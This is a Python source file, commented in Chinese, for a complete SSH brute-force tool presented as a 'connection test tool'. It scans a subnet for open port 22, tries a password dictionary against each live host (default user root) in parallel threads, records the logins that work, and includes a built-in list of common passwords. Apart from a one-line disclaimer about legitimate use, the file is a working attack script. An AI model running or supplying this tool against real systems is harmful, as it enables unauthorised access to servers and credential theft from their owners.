#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSH连接测试工具
用于测试SSH服务连接和认证
仅用于合法的网络管理和安全测试
"""

import paramiko
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import argparse
import sys
import ipaddress
from datetime import datetime


class SSHConnectionTester:
    def __init__(self, timeout=10, max_threads=5):
        self.timeout = timeout
        self.max_threads = max_threads
        self.successful_credentials = []
        self.alive_hosts = []
        self.lock = threading.Lock()

    def parse_network(self, network_input):
        """解析网络输入（单个IP或网段）"""
        hosts = []
        try:
            # 尝试解析为网络
            if '/' in network_input:
                network = ipaddress.ip_network(network_input, strict=False)
                hosts = [str(ip) for ip in network.hosts()]
            else:
                # 单个IP地址
                hosts = [network_input]
        except ValueError:
            print(f"无效的网络地址: {network_input}")
            return []

        return hosts

    def test_connection(self, host, port=22):
        """测试SSH端口是否开放"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception as e:
            return False

    def scan_network(self, network_input, port=22):
        """扫描网段中开放SSH端口的主机"""
        hosts = self.parse_network(network_input)
        if not hosts:
            return []

        print(f"扫描网段: {network_input}")
        print(f"扫描端口: {port}")
        print(f"主机数量: {len(hosts)}")
        print("-" * 50)

        alive_hosts = []

        def check_host(host):
            if self.test_connection(host, port):
                with self.lock:
                    alive_hosts.append(host)
                    print(f"[存活] {host}:{port}")
            else:
                print(f"[关闭] {host}:{port}")

        # 使用线程池扫描
        with ThreadPoolExecutor(max_workers=self.max_threads * 2) as executor:
            futures = [executor.submit(check_host, host) for host in hosts]
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    print(f"扫描异常: {e}")

        print("-" * 50)
        print(f"发现 {len(alive_hosts)} 个开放SSH端口的主机")
        self.alive_hosts = alive_hosts
        return alive_hosts

    def test_ssh_auth(self, host, port, username, password):
        """测试SSH认证"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )

            with self.lock:
                self.successful_credentials.append((host, port, username, password))
                print(f"[成功] {host}:{port} {username}:{password}")

            client.close()
            return True

        except paramiko.AuthenticationException:
            print(f"[失败] {host}:{port} {username}:{password} - 认证失败")
            return False
        except paramiko.SSHException as e:
            print(f"[错误] {host}:{port} {username}:{password} - SSH错误: {e}")
            return False
        except socket.timeout:
            print(f"[超时] {host}:{port} {username}:{password} - 连接超时")
            return False
        except Exception as e:
            print(f"[异常] {host}:{port} {username}:{password} - {e}")
            return False

    def load_dictionary(self, dict_file):
        """加载密码字典"""
        try:
            with open(dict_file, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"字典文件不存在: {dict_file}")
            return []
        except Exception as e:
            print(f"读取字典文件失败: {e}")
            return []

    def run_dictionary_attack(self, hosts, port, username, password_dict):
        """运行密码字典攻击"""
        if isinstance(hosts, str):
            hosts = [hosts]

        print(f"开始测试用户: {username}")
        print(f"目标主机: {len(hosts)} 个")
        print(f"端口: {port}")
        print(f"密码数量: {len(password_dict)}")
        print("-" * 50)

        # 为每个主机和每个密码创建任务
        tasks = []
        for host in hosts:
            for password in password_dict:
                tasks.append((host, port, username, password))

        print(f"总任务数: {len(tasks)}")

        # 使用线程池进行并发测试
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for host, port, username, password in tasks:
                future = executor.submit(self.test_ssh_auth, host, port, username, password)
                futures.append(future)
                time.sleep(0.05)  # 避免过于频繁的连接

            # 等待所有任务完成
            completed = 0
            for future in futures:
                try:
                    future.result()
                    completed += 1
                    if completed % 50 == 0:
                        print(f"已完成: {completed}/{len(tasks)}")
                except Exception as e:
                    print(f"任务执行异常: {e}")

        print("-" * 50)
        if self.successful_credentials:
            print("发现有效凭据:")
            for host, port, username, password in self.successful_credentials:
                print(f"  {host}:{port} {username}:{password}")
        else:
            print("未发现有效凭据")

        return len(self.successful_credentials) > 0

    def run_network_attack(self, network_input, port, username, password_dict):
        """对整个网段运行攻击"""
        # 先扫描存活主机
        alive_hosts = self.scan_network(network_input, port)

        if not alive_hosts:
            print("未发现开放SSH端口的主机")
            return False

        # 对存活主机进行密码测试
        print(f"\n开始对 {len(alive_hosts)} 个主机进行密码测试...")
        return self.run_dictionary_attack(alive_hosts, port, username, password_dict)

    def save_results(self, filename=None):
        """保存结果到文件"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"ssh_results_{timestamp}.txt"

        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("SSH连接测试结果\n")
                f.write("=" * 50 + "\n")
                f.write(f"测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"发现主机数: {len(self.alive_hosts)}\n")
                f.write(f"成功凭据数: {len(self.successful_credentials)}\n\n")

                if self.alive_hosts:
                    f.write("存活主机:\n")
                    for host in self.alive_hosts:
                        f.write(f"  {host}\n")
                    f.write("\n")

                if self.successful_credentials:
                    f.write("有效凭据:\n")
                    for host, port, username, password in self.successful_credentials:
                        f.write(f"  {host}:{port} {username}:{password}\n")

            print(f"结果已保存到: {filename}")
            return True
        except Exception as e:
            print(f"保存结果失败: {e}")
            return False


def create_sample_dict():
    """创建示例密码字典"""
    common_passwords = [
        "123456", "password", "123456789", "12345678", "12345",
        "1234567", "admin", "123123", "qwerty", "abc123",
        "Password", "password123", "admin123", "root", "toor",
        "guest", "test", "user", "welcome", "login"
    ]

    with open('password_dict.txt', 'w', encoding='utf-8') as f:
        for pwd in common_passwords:
            f.write(pwd + '\n')

    print("已创建示例密码字典: password_dict.txt")


def main():
    parser = argparse.ArgumentParser(description='SSH连接测试工具')
    parser.add_argument('target', help='目标主机地址或网段 (例: 192.168.1.1 或 192.168.1.0/24)')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH端口 (默认: 22)')
    parser.add_argument('-u', '--username', default='root', help='用户名 (默认: root)')
    parser.add_argument('-d', '--dict', help='密码字典文件路径')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='连接超时时间 (默认: 10秒)')
    parser.add_argument('--threads', type=int, default=5, help='最大线程数 (默认: 5)')
    parser.add_argument('--create-dict', action='store_true', help='创建示例密码字典')
    parser.add_argument('--scan-only', action='store_true', help='仅扫描存活主机，不进行密码测试')
    parser.add_argument('--save-results', type=str, help='保存结果到指定文件')

    args = parser.parse_args()

    if args.create_dict:
        create_sample_dict()
        return

    if not args.scan_only and not args.dict:
        print("请指定密码字典文件路径 (-d) 或使用 --scan-only 仅扫描主机")
        sys.exit(1)

    # 创建测试实例
    tester = SSHConnectionTester(
        timeout=args.timeout,
        max_threads=args.threads
    )

    print("=" * 60)
    print("SSH连接测试工具")
    print("=" * 60)

    try:
        if args.scan_only:
            # 仅扫描模式
            tester.scan_network(args.target, args.port)
        else:
            # 完整测试模式
            password_dict = tester.load_dictionary(args.dict)
            if not password_dict:
                print("密码字典为空或加载失败")
                sys.exit(1)

            # 判断是单个主机还是网段
            if '/' in args.target:
                tester.run_network_attack(args.target, args.port, args.username, password_dict)
            else:
                tester.run_dictionary_attack([args.target], args.port, args.username, password_dict)

        # 保存结果
        if args.save_results:
            tester.save_results(args.save_results)
        elif tester.successful_credentials or tester.alive_hosts:
            tester.save_results()

    except KeyboardInterrupt:
        print("\n测试被用户中断")
    except Exception as e:
        print(f"测试过程中发生错误: {e}")


if __name__ == "__main__":
    main()
